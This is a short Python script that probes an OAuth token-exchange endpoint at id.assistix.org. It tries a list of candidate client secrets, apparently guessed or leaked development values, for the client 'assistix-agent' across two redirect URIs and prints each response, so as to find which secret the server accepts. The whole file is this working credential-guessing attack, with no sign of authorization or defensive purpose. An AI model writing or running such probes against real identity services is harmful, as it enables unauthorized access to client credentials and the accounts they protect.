import json
import urllib.request

secrets = [
    "assistix-chat-oauth-local-20260514-do-not-commit-public-repos",
    "assistix-agent-oauth-local-20260514-do-not-commit-public-repos",
    "assistix-agent-oauth-local-20261105-do-not-commit-public-repos",
    "assistix-agent-oauth-local-20261104-do-not-commit-public-repos",
    "assistix-agent-oauth-local-20261031-do-not-commit-public-repos",
    "assistix-agent-oauth-local-20261107-do-not-commit-public-repos",
    "assistix-agent-oauth-20260514",
    "YOUR_OAUTH_CLIENT_SECRET_HERE",
]

redirects = [
    "http://127.0.0.1:17865/assistix/callback",
    "https://agent.assistix.org/auth/callback.php",
]

for secret in secrets:
    for redirect in redirects:
        payload = {
            "code": "invalid-probe-code",
            "client_id": "assistix-agent",
            "client_secret": secret,
            "redirect_uri": redirect,
        }
        req = urllib.request.Request(
            "https://id.assistix.org/api/exchange.php",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                body = resp.read().decode("utf-8", "replace")
                code = resp.status
        except urllib.error.HTTPError as e:
            code = e.code
            body = e.read().decode("utf-8", "replace")
        print(f"{code} | {secret[:48]} | {redirect.split('/')[2]} | {body[:160]}")
